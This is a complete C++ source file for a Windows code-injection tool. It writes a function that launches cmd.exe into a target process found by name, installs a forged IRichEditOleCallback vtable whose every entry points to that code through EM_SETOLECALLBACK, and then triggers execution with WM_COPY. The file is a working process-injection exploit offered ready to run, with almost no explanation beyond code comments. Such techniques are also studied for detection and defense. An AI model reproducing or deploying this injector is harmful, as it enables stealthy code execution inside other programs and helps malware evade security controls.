// IRichEditOleCallback_Injection.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include "Commctrl.h"
#include <string>
#include <iostream>
#include <tlhelp32.h>
#include <strsafe.h>
#include <ntstatus.h>
#include <Richedit.h>
#include <RichOle.h>


//core idea for the function injection taken from: http://www.rohitab.com/discuss/topic/39357-code-cave-injection-tutorial-c/


//this is a definition for WinExec, taken from MSDN
//required so it can be called from the injected function
typedef int(WINAPI* myWinExec)(
	LPCSTR lpCmdLine,
	UINT   uCmdShow
	);

//all data parameters that will be needed by the injected function, e.g.: function names, parameters, etc...
struct PARAMETERS {
	SIZE_T FuncInj;
	char command[256];
};


//make my own ole callback interface, code taken from: https://github.com/tigersoldier/wine/blob/master/programs/wordpad/olecallback.c
struct IRichEditOleCallbackVtbl {
	SIZE_T RichEditOleCallback_QueryInterface;
	SIZE_T RichEditOleCallback_AddRef;
	SIZE_T RichEditOleCallback_Release;
	SIZE_T RichEditOleCallback_GetNewStorage;
	SIZE_T RichEditOleCallback_GetInPlaceContext;
	SIZE_T RichEditOleCallback_ShowContainerUI;
	SIZE_T RichEditOleCallback_QueryInsertObject;
	SIZE_T RichEditOleCallback_DeleteObject;
	SIZE_T RichEditOleCallback_QueryAcceptData;
	SIZE_T RichEditOleCallback_ContextSensitiveHelp;
	SIZE_T RichEditOleCallback_GetClipboardData;
	SIZE_T RichEditOleCallback_GetDragDropEffect;
	SIZE_T RichEditOleCallback_GetContextMenu;
};

struct IRichEditOleCallbackImpl {
	const IRichEditOleCallbackVtbl *vtbl;
	IStorage *stg;
	int item_num;
};

/*
https://docs.microsoft.com/en-us/windows/desktop/api/Richole/nn-richole-iricheditolecallback

The IRichEditOleCallback interface has these methods.

Method	Description
IRichEditOleCallback::ContextSensitiveHelp	Indicates if the application should transition into or out of context-sensitive help mode. This method should implement the functionality described for IOleWindow::ContextSensitiveHelp.
IRichEditOleCallback::DeleteObject	Sends notification that an object is about to be deleted from a rich edit control. The object is not necessarily being released when this member is called.
IRichEditOleCallback::GetClipboardData	Allows the client to supply its own clipboard object.
IRichEditOleCallback::GetContextMenu	Queries the application for a context menu to use on a right-click event.
IRichEditOleCallback::GetDragDropEffect	Allows the client to specify the effects of a drop operation.
IRichEditOleCallback::GetInPlaceContext	Provides the application and document-level interfaces and information required to support in-place activation.
IRichEditOleCallback::GetNewStorage	Provides storage for a new object pasted from the clipboard or read in from an Rich Text Format (RTF) stream.
IRichEditOleCallback::QueryAcceptData	During a paste operation or a drag event, determines if the data that is pasted or dragged should be accepted.
IRichEditOleCallback::QueryInsertObject	Queries the application as to whether an object should be inserted. The member is called when pasting and when reading Rich Text Format (RTF).
IRichEditOleCallback::ShowContainerUI	Indicates whether or not the application is to display its container UI.

HRESULT GetClipboardData(
CHARRANGE    *lpchrg,
DWORD        reco,
LPDATAOBJECT *lplpdataobj
);
*/
//this is the to be injected function
int ToBeInjected(CHARRANGE *lpchrg, DWORD reco, LPDATAOBJECT *lplpdataobj)
{
#ifdef _WIN64	
	PARAMETERS * myparam = (PARAMETERS *)0x0000440000000000; 	//parameters will be placed in fixed location
#endif
#ifdef _X86_	
	PARAMETERS * myparam = (PARAMETERS *)0x44000000; 	//parameters will be placed in fixed location
#endif
	myWinExec WE = (myWinExec)myparam->FuncInj; //we get the WinExec address and convert it to a function
	WE(myparam->command, 1); //call the function
	return 0;  //need to return something
}

DWORD Useless() {      //this is useless to our injection but is needed to calculate the length of MyFunc
	return 0;
}

//this is a structure to store injection related info, PID and function address
typedef struct INJECTINFO
{
	DWORD pid;
	LPVOID address;
} *LPINJECTINFO;

void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process
	wprintf(L"[-] %s failed with error 0x%x: %s", lpszFunction, dw, (wchar_t *)lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

DWORD FindPIDByName(LPWSTR pName)
{
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1)
	{
		ErrorExit(TEXT("CreateToolhelp32Snapshot"));
	}
	if (Process32First(snapshot, &pEntry) == TRUE)
	{
		while (Process32Next(snapshot, &pEntry) == TRUE)
		{
			if (NULL != wcsstr(pEntry.szExeFile, pName))
			{
				return pEntry.th32ProcessID;
			}
		}
		ErrorExit(TEXT("Process32Next"));
	}
	else
	{
		ErrorExit(TEXT("Process32First"));
	}

	CloseHandle(snapshot);
	return 0;
}

int GetFunctionAddressFromDll(PSTR pszDllName, PSTR pszFunctionName, PVOID *ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		ErrorExit(TEXT("GetModuleHandleA"));
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		ErrorExit(TEXT("GetProcAddress"));
	}

	*ppvFunctionAddress = pvFunctionAddress;
	return STATUS_SUCCESS;
}


void print_window_info(HWND hwnd)
{
	//get the window title
	int length = GetWindowTextLength(hwnd);
	char* buffer = new char[length + 1];
	GetWindowTextA(hwnd, buffer, length + 1);
	std::string windowTitle(buffer);
	//get the window class name
	char* buffer_class_name = new char[MAX_PATH + 1];
	GetClassNameA(hwnd, buffer_class_name, MAX_PATH + 1);
	std::string windowClass(buffer_class_name);

	//print out
	std::cout << hwnd << ":  " << windowTitle << std::endl;
	std::cout << hwnd << ":  " << windowClass << std::endl;
}

//general function to insert something to the target
SIZE_T copy_data_to_target(DWORD pid, LPVOID pointer, SIZE_T size)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		ErrorExit(TEXT("OpenProcess"));
	}
	else
	{
		printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);
	}
	// Allocate memory in target process for the to be injected function
	printf("[*] Allocating memory in target process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}

	printf("[+] Memory allocated at: 0x%Ix\n", (SIZE_T)lpBaseAddress);

	SIZE_T *lpNumberOfBytesWritten = 0;

	//write our function to the target process
	BOOL resWPM;
	printf("[*] Writing data to target process\n");
	resWPM = WriteProcessMemory(hProcess, lpBaseAddress, pointer, size, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote data to target process\n");
	return (SIZE_T)lpBaseAddress;
}

//the actual injector function
void inject_IRichEditOleCallback(LPINJECTINFO ii, HWND hwnd)
{
	DWORD dwProcessID = 0;
	GetWindowThreadProcessId(hwnd, &dwProcessID); //get the PID for the window
	if (dwProcessID == ii->pid) //if it matches the pid where we want to inject
	{
		//get IRichEditOle interface described here: https://docs.microsoft.com/en-us/windows/desktop/controls/em-getoleinterface
		//other useful: https://social.msdn.microsoft.com/Forums/sqlserver/en-US/6cdf22ff-c007-4ec7-a6c5-8304a2e85aeb/problem-inserting-bmp-file-into-cricheditview-please-help?forum=vclanguage
		
		//this is to get the current data, you need a valid pointer inside the target process, where the IRichEditOle object address will be copied
		print_window_info(hwnd); //just printf debugging :)
		SIZE_T* pole = NULL;
		SIZE_T pole_address = copy_data_to_target(ii->pid, &pole, sizeof(SIZE_T));
		printf("[+] Pole address: 0x%Ix\n", (SIZE_T)pole_address); //debug result
		DWORD smr = SendMessage(hwnd, EM_GETOLEINTERFACE, NULL, (LPARAM)pole_address);
		printf("[+] SendMessage result: 0x%x\n", (UINT)smr); //debug result
		
		if (smr != NULL)
		{
			DWORD res;
			
			//populate vtable with our injected address
			IRichEditOleCallbackVtbl olecallbackVtbl = {
				(SIZE_T)ii->address,// RichEditOleCallback_QueryInterface,
				(SIZE_T)ii->address,//RichEditOleCallback_AddRef,
				(SIZE_T)ii->address,//RichEditOleCallback_Release,
				(SIZE_T)ii->address,//RichEditOleCallback_GetNewStorage,
				(SIZE_T)ii->address,//RichEditOleCallback_GetInPlaceContext,
				(SIZE_T)ii->address,//RichEditOleCallback_ShowContainerUI,
				(SIZE_T)ii->address,//RichEditOleCallback_QueryInsertObject,
				(SIZE_T)ii->address,//RichEditOleCallback_DeleteObject,
				(SIZE_T)ii->address,//RichEditOleCallback_QueryAcceptData,
				(SIZE_T)ii->address,//RichEditOleCallback_ContextSensitiveHelp,
				(SIZE_T)ii->address,//RichEditOleCallback_GetClipboardData,
				(SIZE_T)ii->address,//RichEditOleCallback_GetDragDropEffect,
				(SIZE_T)ii->address,//RichEditOleCallback_GetContextMenu
			};

			//copy vtable to target
			SIZE_T olecallbackvtbl_address = copy_data_to_target(ii->pid, &olecallbackVtbl, sizeof(IRichEditOleCallbackVtbl));

			//populate olecallback with initial data, and the address of vtable in the target
			struct IRichEditOleCallbackImpl olecallback = {
				(IRichEditOleCallbackVtbl *)olecallbackvtbl_address, NULL, 0
			};

			//copy olecallback to target
			SIZE_T olecallback_address = copy_data_to_target(ii->pid, &olecallback, sizeof(IRichEditOleCallbackImpl));

			//update olecallback in target
			/*
			https://docs.microsoft.com/en-us/windows/desktop/controls/em-setolecallback
			wParam
			This parameter is not used; it must be zero.
			lParam
			Pointer to an IRichEditOleCallback object. The control calls the AddRef method for the object before returning.
			*/
			printf("[+] Set Callback address\n");
			res = SendMessage(hwnd, EM_SETOLECALLBACK, NULL, (LPARAM)olecallback_address); //injection!!!
			printf("[+] SendMessage result: 0x%x\n", (UINT)res); //debug result
			
			//triggering the code
			res = SendMessage(hwnd, WM_COPY, NULL, NULL);
			printf("[+] SendMessage result: 0x%x\n", (UINT)res); //debug result

		}
	}
}

//callback function for the Child window enumeration, lparam contains the injection info
static BOOL CALLBACK enumChildWindowCallback(HWND hwnd, LPARAM lparam)
{
	//print_window_info(hWnd);
	inject_IRichEditOleCallback((LPINJECTINFO)lparam, hwnd);
	//return TRUE so the enumeration doesn't stop
	return TRUE;
}

//callback function for the main window enumeration, lparam contains the injection info
static BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lparam)
{
	//print_window_info(hWnd);
	EnumChildWindows(hWnd, enumChildWindowCallback, lparam);
	//return TRUE so the enumeration doesn't stop
	return TRUE;
}



int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 2)
	{
		printf("Usage: inject.exe [process name]\n");
		return 1;
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		ErrorExit(TEXT("OpenProcess"));
	}
	else
	{
		printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);
	}

	// Allocate memory in target process for the to be injected function
	printf("[*] Allocating memory for shellcode in process\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}

	printf("[+] Memory allocated at: 0x%Ix\n", (SIZE_T)lpBaseAddress);

	SIZE_T *lpNumberOfBytesWritten = 0;

	//setup parameters struct
	char * command = "cmd.exe";
	PARAMETERS data;
	data.FuncInj = (SIZE_T)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
	strcpy_s(data.command, command);

	//calculate our inejtec function size
	SIZE_T size_myFunc = (SIZE_T)Useless - (SIZE_T)ToBeInjected;

	//write our function to the target process
	BOOL resWPM;
	printf("[*] Writing shellcode to process\n");
	resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)ToBeInjected, size_myFunc, lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Wrote shellcode to target process\n");

	//allocate memory in the target for the PARAMETERS on a fixed address
	printf("[*] Allocating memory for PARAMETERS in process\n");
#ifdef _WIN64	
	SIZE_T param_address = 0x0000440000000000;
#endif
#ifdef _X86_	
	SIZE_T param_address = 0x44000000;
#endif
	LPVOID DataAddress = VirtualAllocEx(hProcess, (LPVOID)param_address, sizeof(PARAMETERS), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[*] Writing PARAMETERS to process\n");
	resWPM = WriteProcessMemory(hProcess, DataAddress, &data, sizeof(PARAMETERS), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}

	printf("[+] Shellcode is written to memory\n");

	std::cout << "Enmumerating windows..." << std::endl;
	
	//setup injection info
	INJECTINFO ii;
	ii.address = lpBaseAddress; //lpBaseAddress contains our shellcode
	ii.pid = pid;
	EnumWindows(enumWindowCallback, (LPARAM)(&ii));

	return 0;
}

